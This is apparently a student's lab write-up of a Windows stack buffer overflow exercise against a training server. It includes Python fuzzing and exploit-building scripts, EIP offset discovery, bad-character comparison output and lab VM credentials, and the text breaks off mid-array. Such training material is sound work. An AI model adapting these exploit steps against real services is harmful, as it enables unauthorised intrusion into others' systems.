## Description

You are working for a small software development company, and their latest development project is a small encrypted server they built to exchange information between their team. They task you with performing a security assessment of this software and provide you with a copy of it. You see that the program listens for remote connections on port `21449`, so you need to fuzz the program to see whether it is vulnerable to any type of buffer overflows.

Download the attached file in the question below, perform all of the steps you learned in this module to debug the program with `x32dbg` on the Windows VM you used in the previous sections and write a working remote exploit. Once you have the exploit working on the Windows VM, try running it remotely on the target server to get a reverse shell and read the flag on the Administrator's Desktop.

**Note**: You need to be connected to the VPN to be able to interact with the remote server, so download the VPN key in case you want to run the exploit from your own machine. The PwnBox instance is already connected to the VPN, so you should be able to connect to the remote server.

**Tip**: If you want to download the `assessment.zip` file to the Windows VM for debugging, right-click on the button below, and select 'Copy Link', then download it in PwnBox and copy it to the remote server.
## Gradual Fuzzing the program

First we need to download the file and transfer it to the VM, i will use a python server:

```bash
└─$ xfreerdp3 /v:10.129.43.22 /u:htb-student /p:Academy_student! 
```

```bash
└─$ python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
```

Download on Desktop with `powershell`:

```powershell
PS C:\Users\htb-student\Desktop> certutil -urlcache -split -f http://10.10.15.163:5000/assessment.zip assessment.zip
****  Online  ****
  000000  ...
  01df8d
CertUtil: -URLCache command completed successfully.
```

Now we can extract the folder on desktop and attach the process to the debugger after running it.

We use this script to gradual fuzz and retrieve the bytes number that can crash the running program:

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```

We use it in the VM Idle and check `x32dbg` for `EIP` address changes:

![Pasted image 20251010163236.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251010163236.png)

500 bytes are enough. Once the program crashes and `EIP` gets overwritten, we know that the last amount of bytes we sent is what crashed the program and that the program is vulnerable to a buffer overflow
## Building the Exploit

Now that we know the bytes amount we can craft our remote exploit.
### Controlling EIP

We'll start by creating a unique pattern `500` bytes long, using `ERC --pattern c 500` as we previously did:

```bash
------------------------------------------------------------------------------------------  
Pattern created at: 10/10/2025 7:40:07 AM. Pattern created by: No_Author_Set. Pattern length: 500  
------------------------------------------------------------------------------------------  
  
Ascii:
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
"9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
"Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
"i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
"7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
"Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
```

Now we start copy that to our `bofexploit.py`:

```python
└─$ cat bofexploit.py 
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
        print("Could not establish a connection")

def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
                    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
                    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
                    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
                    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

eip_offset()
```

Once our `eip_offset()` function is ready, we can restart our program in `x32dbg` and run our code, and our program should crash, and we should see `EIP` overwritten with our pattern:

`70413670`

![Pasted image 20251010165041.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251010165041.png)

Now we can use `msf-pattern_offset -q EIP ` to calculate the exact offset:

```bash
└─$ msf-pattern_offset -q 70413670                        
[*] Exact match at offset 469
```

We can update add this function to the exploit:

```python
def eip_control():
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

eip_control()
```

Now we have to confirm that we can control the exact value that goes into `EIP` so we run it again calling only the last function:

![Pasted image 20251010171604.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251010171604.png)

And we confirm with `42424242` wich is the byte for `BBBB`.

### Identifying Bad Characters

Our next step is to identify whether we should avoid using any bad characters in our input. We can start by running `ERC --bytearray` in `x32dbg` to create our `ByteArray_1.bin` file. Then we can use a  `bad_chars()` function in the exploit:

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
        0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
        0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
        0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
        0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
        0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
        0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
        0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
        0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
        0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
        0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
        0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
        0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
        0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
        0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
        0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
        0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
        0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
        0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
        0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
        0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
        0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
        0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

We run it again calling only the last function to identify bad chars, once we restart our program in `x32dbg` and run our exploit, we can use `ERC --compare` to compare the bytes at the `ESP` address with the `ByteArray_1.bin` file:

```powershell
ERC --compare 00EEFB48 C:\Users\htb-student\Desktop\ByteArray_1.bin

                   ----------------------------------------------------  
        From Array | 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |   
From Memory Region | 00 37 CE 00 38 23 CE 00 A9 05 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |   
From Memory Region | 00 00 00 00 00 00 00 00 60 1C 40 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | C0 C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
                   ----------------------------------------------------
```

We see that after the first character, `00`, all remaining bytes are different. `This indicates that 0x00 truncated the remaining input, and hence it should be considered a bad character.`

### Removing Bad characters

We modify our code to not include this and rerun to check:

```powershell
ERC --bytearray -bytes 0x00
```

New exploit code:

```python
def bad_chars():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
	    0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
	    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
	    0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
	    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
	    0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30,
	    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
	    0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40,
	    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
	    0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50,
	    0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
	    0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60,
	    0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
	    0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70,
	    0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
	    0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80,
	    0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88,
	    0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90,
	    0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98,
	    0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0,
	    0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8,
	    0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0,
	    0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8,
	    0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0,
	    0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8,
	    0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0,
	    0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8,
	    0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0,
	    0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8,
	    0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0,
	    0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8,
	    0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

We run again to check for other bad chars:

```powershell
ERC --compare 00E5FB48 C:\Users\htb-student\Desktop\ByteArray_2.bin

Comparing memory region starting at 0xE5FB48 to bytes in file C:\Users\htb-student\Desktop\ByteArray_2.bin  
                   ----------------------------------------------------  
        From Array | 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10  |   
From Memory Region | 01 02 03 04 05 06 07 08 09 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20  |   
From Memory Region | 00 00 00 00 00 00 00 00 60 1C 40 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F A0  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF B0  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF C0  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF D0  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF E0  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF F0  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
                   ----------------------------------------------------
```

We can see it's changing from `09`, we have to delete this other bad char:

```powershell
ERC --bytearray -bytes 0x00,0x09
```

Update the exploit code with ByteArray_3:

```python
def bad_chars():
    all_chars = bytes([
		0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
	    0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11,
	    0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,
	    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21,
	    0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
	    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31,
	    0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
	    0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41,
	    0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
	    0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51,
	    0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
	    0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61,
	    0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
	    0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71,
	    0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79,
	    0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81,
	    0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
	    0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91,
	    0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99,
	    0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1,
	    0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9,
	    0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1,
	    0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9,
	    0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1,
	    0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9,
	    0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1,
	    0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9,
	    0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1,
	    0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9,
	    0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1,
	    0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9,
	    0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

Run and check again:

```powershell
ERC --compare 00E2FB48 C:\Users\htb-student\Desktop\ByteArray_3.bin

Comparing memory region starting at 0xE2FB48 to bytes in file C:\Users\htb-student\Desktop\ByteArray_3.bin  
                   ----------------------------------------------------  
        From Array | 01 02 03 04 05 06 07 08 0A 0B 0C 0D 0E 0F 10 11  |   
From Memory Region | 01 02 03 04 05 06 07 08 00 05 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21  |   
From Memory Region | 00 00 00 00 00 00 00 00 60 1C 40 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90 91  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F A0 A1  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF B0 B1  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF C0 C1  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF D0 D1  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF E0 E1  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF F0 F1  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
        From Array | F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF  |   
From Memory Region | 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |   
                   |                                                  |   
                   ----------------------------------------------------
```

We have to remove `0A` too here:

```powershell
ERC --bytearray -bytes 0x00,0x09,0x0A
```

Updated exploit with ByteArray_4.txt:

```python
def bad_chars():
    all_chars = bytes([
	    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12,
        0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
	    0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22,
	    0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
	    0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32,
	    0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A,
	    0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42,
	    0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
	    0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,
	    0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
	    0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62,
	    0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A,
	    0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72,
	    0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A,
	    0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82,
	    0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A,
	    0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92,
	    0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A,
	    0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2,
	    0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA,
	    0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2,
	    0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA,
	    0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2,
	    0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA,
	    0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2,
